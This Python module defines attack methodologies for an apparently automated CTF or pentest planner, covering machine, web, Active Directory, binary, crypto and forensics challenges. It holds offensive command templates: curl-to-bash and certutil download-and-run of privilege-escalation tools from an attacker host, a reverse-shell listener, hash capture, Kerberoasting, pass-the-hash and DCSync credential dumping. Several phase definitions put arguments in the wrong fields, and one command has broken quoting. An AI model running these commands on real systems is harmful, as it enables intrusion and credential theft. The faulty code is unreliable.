"""Methodology modules — domain-specific attack pattern definitions.

Each methodology defines phases, techniques, and tool commands for a
specific challenge type. Loaded dynamically by the planner.
"""

from __future__ import annotations

from dataclasses import dataclass, field


@dataclass
class Technique:
    name: str
    description: str
    tools: list[str]
    commands: list[str]          # With {target}, {port}, {wordlist}, {lhost}, {lport} placeholders
    risk: str = "low"
    refs: list[str] = field(default_factory=list)


@dataclass
class MethodPhase:
    name: str
    description: str
    techniques: list[Technique]
    prereqs: list[str] = field(default_factory=list)


@dataclass
class Methodology:
    name: str
    description: str
    types: list[str]
    phases: list[MethodPhase]


# ═══════════════════════════════════════════════════════════════════════════
#  MACHINE COMPROMISE
# ═══════════════════════════════════════════════════════════════════════════

MACHINE = Methodology(
    name="Machine Compromise",
    description="Full recon-to-root lifecycle",
    types=["machine"],
    phases=[
        MethodPhase("reconnaissance", "Map the attack surface", [
            Technique("Full TCP Scan", "All 65535 TCP ports", ["nmap"],
                     ["nmap -sS -p- --min-rate 5000 -oN recon/tcp_full.txt {target}"]),
            Technique("Service Detection", "Version + default scripts on open ports", ["nmap"],
                     ["nmap -sV -sC -p {ports} -oN recon/services.txt {target}"]),
            Technique("UDP Top Ports", "Common UDP services", ["nmap"],
                     ["nmap -sU --top-ports 20 -oN recon/udp.txt {target}"]),
        ]),
        MethodPhase("enumeration", "Deep-dive into services", ["reconnaissance"], [
            Technique("Web Directories", "Hidden paths and files", ["gobuster", "ffuf", "feroxbuster"],
                     ["gobuster dir -u http://{target}:{port} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o enum/dirs.txt",
                      "ffuf -u http://{target}:{port}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -o enum/ffuf.json"]),
            Technique("Subdomain Enum", "Virtual hosts", ["ffuf"],
                     ["ffuf -u http://{target} -H 'Host: FUZZ.{hostname}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"]),
            Technique("SMB Enum", "Shares and users", ["smbclient", "enum4linux-ng", "crackmapexec"],
                     ["smbclient -L //{target} -N", "enum4linux-ng -A {target}"]),
            Technique("LDAP Enum", "Domain structure", ["ldapsearch"],
                     ["ldapsearch -x -H ldap://{target} -b '' -s base namingContexts"]),
            Technique("SNMP Walk", "System info via SNMP", ["snmpwalk", "onesixtyone"],
                     ["onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt {target}"]),
        ]),
        MethodPhase("vulnerability_analysis", "Find exploitable weaknesses", ["enumeration"], [
            Technique("CVE Search", "Match versions to known CVEs", ["searchsploit"],
                     ["searchsploit {service} {version}"]),
            Technique("Web Vuln Scan", "Automated vulnerability detection", ["nikto", "nuclei"],
                     ["nikto -h http://{target}:{port} -o vuln/nikto.txt",
                      "nuclei -u http://{target}:{port} -o vuln/nuclei.txt"]),
        ]),
        MethodPhase("exploitation", "Gain initial access", ["vulnerability_analysis"], [
            Technique("Exploit Execution", "Weaponize identified vulnerability", ["python3", "msfconsole"],
                     [], "high"),
            Technique("Reverse Shell", "Establish interactive access", ["nc", "pwncat-cs"],
                     ["nc -lvnp {lport}"], "high"),
        ]),
        MethodPhase("internal_enumeration", "Map internals from foothold", ["exploitation"], [
            Technique("LinPEAS", "Linux privesc enumeration", ["linpeas"],
                     ["curl http://{lhost}:{lport}/linpeas.sh | bash | tee /tmp/linpeas.txt"], "medium"),
            Technique("WinPEAS", "Windows privesc enumeration", ["winpeas"],
                     ["certutil -urlcache -f http://{lhost}:{lport}/winPEASx64.exe C:\\Temp\\wp.exe && C:\\Temp\\wp.exe"], "medium"),
        ]),
        MethodPhase("privilege_escalation", "Escalate to root/SYSTEM", ["internal_enumeration"], [
            Technique("SUID Binaries", "Misconfigured SUID", ["find"],
                     ["find / -perm -4000 -type f 2>/dev/null"], "high"),
            Technique("Sudo Misconfig", "Overly permissive sudo", ["sudo"],
                     ["sudo -l"], "medium"),
            Technique("Kernel Exploit", "Vulnerable kernel", ["gcc", "python3"], [], "critical"),
        ]),
    ],
)


# ═══════════════════════════════════════════════════════════════════════════
#  WEB EXPLOITATION
# ═══════════════════════════════════════════════════════════════════════════

WEB = Methodology(
    name="Web Application Assessment",
    description="OWASP-aligned web exploitation",
    types=["web"],
    phases=[
        MethodPhase("reconnaissance", "Map attack surface", [
            Technique("Tech Fingerprint", "Identify stack", ["whatweb", "curl"],
                     ["whatweb {target}", "curl -sI {target}"]),
            Technique("Spider", "Crawl all pages", ["gospider", "hakrawler"],
                     ["gospider -s http://{target} -d 3 -o enum/spider"]),
        ]),
        MethodPhase("enumeration", "Find hidden endpoints", ["reconnaissance"], [
            Technique("Parameter Discovery", "Hidden GET/POST params", ["arjun"],
                     ["arjun -u http://{target}/{endpoint}"]),
            Technique("API Fuzzing", "Enumerate API routes", ["ffuf"],
                     ["ffuf -u http://{target}/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt"]),
        ]),
        MethodPhase("vulnerability_analysis", "Test for vulns", ["enumeration"], [
            Technique("SQLi Testing", "SQL injection", ["sqlmap"],
                     ["sqlmap -u '{url}' --batch --level 3 --risk 2"], "medium"),
            Technique("XSS Testing", "Cross-site scripting", ["dalfox"],
                     ["dalfox url '{url}'"], "medium"),
            Technique("SSRF/CMDi", "Server-side request forgery / command injection", ["curl"], [], "high"),
        ]),
    ],
)


# ═══════════════════════════════════════════════════════════════════════════
#  ACTIVE DIRECTORY
# ═══════════════════════════════════════════════════════════════════════════

AD = Methodology(
    name="Active Directory Compromise",
    description="Enterprise AD tradecraft",
    types=["active_directory"],
    phases=[
        MethodPhase("reconnaissance", "External enumeration", [
            Technique("Network Poisoning", "LLMNR/NBT-NS hash capture", ["responder"],
                     ["responder -I {interface} -wrf"], "medium"),
            Technique("AS-REP Roasting", "Pre-auth disabled accounts", ["impacket-GetNPUsers"],
                     ["impacket-GetNPUsers {domain}/ -dc-ip {target} -no-pass -usersfile users.txt"], "medium"),
        ]),
        MethodPhase("enumeration", "Map AD with BloodHound", ["reconnaissance"], [
            Technique("BloodHound Collection", "Full AD relationship map", ["bloodhound-python"],
                     ["bloodhound-python -u '{user}' -p '{password}' -d {domain} -ns {target} -c all"], "medium"),
        ]),
        MethodPhase("lateral_movement", "Move between machines", ["enumeration"], [
            Technique("Pass-the-Hash", "NTLM hash auth", ["crackmapexec", "evil-winrm"],
                     ["crackmapexec smb {target} -u {user} -H {hash}",
                      "evil-winrm -i {target} -u {user} -H {hash}"], "high"),
            Technique("Kerberoasting", "Crack service tickets", ["impacket-GetUserSPNs", "hashcat"],
                     ["impacket-GetUserSPNs {domain}/{user}:{password} -dc-ip {target} -request -outputfile kerb.txt",
                      "hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt"], "high"),
        ]),
        MethodPhase("domain_compromise", "Domain Admin", ["lateral_movement"], [
            Technique("DCSync", "Dump domain hashes", ["impacket-secretsdump"],
                     ["impacket-secretsdump {domain}/{user}@{target} -hashes :{hash}"], "critical"),
        ]),
    ],
)


# ═══════════════════════════════════════════════════════════════════════════
#  BINARY EXPLOITATION (PWN)
# ═══════════════════════════════════════════════════════════════════════════

PWN = Methodology(
    name="Binary Exploitation",
    description="Buffer overflows to ROP chains",
    types=["pwn"],
    phases=[
        MethodPhase("reconnaissance", "Binary triage", [
            Technique("File Analysis", "Architecture and type", ["file", "checksec"],
                     ["file {binary}", "checksec --file={binary}"]),
        ]),
        MethodPhase("enumeration", "Static + dynamic analysis", ["reconnaissance"], [
            Technique("Disassembly", "Control flow analysis", ["ghidra", "objdump"],
                     ["objdump -d {binary} | less"]),
            Technique("Dynamic Debug", "GDB with fuzzing", ["gdb", "python3"],
                     ["gdb -q {binary}"], "medium"),
        ]),
        MethodPhase("exploitation", "Construct exploit", ["enumeration"], [
            Technique("ROP Chain", "Return-oriented programming", ["python3", "pwntools"],
                     ["python3 exploit.py"], "high"),
        ]),
    ],
)


# ═══════════════════════════════════════════════════════════════════════════
#  REVERSE ENGINEERING
# ═══════════════════════════════════════════════════════════════════════════

REVERSING = Methodology(
    name="Reverse Engineering",
    description="Binary analysis and algorithm reconstruction",
    types=["reversing"],
    phases=[
        MethodPhase("reconnaissance", "Behavioral analysis", [
            Technique("Strings + Calls", "Static surface analysis", ["strings", "ltrace", "strace"],
                     ["strings {binary}", "ltrace ./{binary}", "strace ./{binary}"]),
        ]),
        MethodPhase("enumeration", "Decompilation", ["reconnaissance"], [
            Technique("Decompile", "Pseudocode recovery", ["ghidra"],
                     ["ghidra"]),
            Technique("Unpack", "Remove obfuscation", ["upx"],
                     ["upx -d {binary}"]),
        ]),
        MethodPhase("exploitation", "Solve / Patch", ["enumeration"], [
            Technique("Keygen / Patch", "Generate valid input or patch binary", ["python3", "gdb"],
                     ["python3 solve.py"], "medium"),
        ]),
    ],
)


# ═══════════════════════════════════════════════════════════════════════════
#  CRYPTOGRAPHY
# ═══════════════════════════════════════════════════════════════════════════

CRYPTO = Methodology(
    name="Cryptography",
    description="Crypto challenge analysis and exploitation",
    types=["crypto"],
    phases=[
        MethodPhase("reconnaissance", "Algorithm identification", [
            Technique("Identify Cipher", "Determine crypto primitive", ["python3"],
                     ["python3 -c \"import analyze; analyze.identify('{ciphertext}')'\""]),
        ]),
        MethodPhase("enumeration", "Implementation analysis", ["reconnaissance"], [
            Technique("Code Review", "Find mathematical flaws", ["python3"], []),
        ]),
        MethodPhase("exploitation", "Mathematical exploitation", ["enumeration"], [
            Technique("Crypto Attack", "Exploit weakness", ["python3", "sage"],
                     ["python3 solve.py", "sage solve.sage"], "medium"),
        ]),
    ],
)


# ═══════════════════════════════════════════════════════════════════════════
#  FORENSICS / DFIR
# ═══════════════════════════════════════════════════════════════════════════

FORENSICS = Methodology(
    name="Digital Forensics",
    description="DFIR artifact analysis",
    types=["forensics"],
    phases=[
        MethodPhase("reconnaissance", "Artifact ingestion", [
            Technique("PCAP Analysis", "Network traffic", ["wireshark", "tshark"],
                     ["tshark -r {pcap} -Y 'http' -T fields -e http.host -e http.request.uri"]),
            Technique("Memory Analysis", "RAM dump", ["volatility3"],
                     ["vol3 -f {dump} windows.info", "vol3 -f {dump} windows.pslist"]),
            Technique("Disk Analysis", "Disk image", ["autopsy", "sleuthkit"],
                     ["fls -r {image}"]),
        ]),
        MethodPhase("enumeration", "Data filtering", ["reconnaissance"], [
            Technique("Timeline", "Reconstruct attacker actions", ["volatility3", "tshark"], []),
        ]),
        MethodPhase("exploitation", "Payload extraction", ["enumeration"], [
            Technique("Extract Flag", "Deobfuscate and extract", ["python3", "cyberchef"],
                     ["python3 extract.py"], "info"),
        ]),
    ],
)


# ═══════════════════════════════════════════════════════════════════════════
#  REGISTRY
# ═══════════════════════════════════════════════════════════════════════════

REGISTRY: dict[str, Methodology] = {
    "machine": MACHINE,
    "web": WEB,
    "active_directory": AD,
    "pwn": PWN,
    "reversing": REVERSING,
    "crypto": CRYPTO,
    "forensics": FORENSICS,
}


def get_methodology(challenge_type: str) -> Methodology | None:
    return REGISTRY.get(challenge_type)


def list_methodologies() -> list[str]:
    return list(REGISTRY.keys())
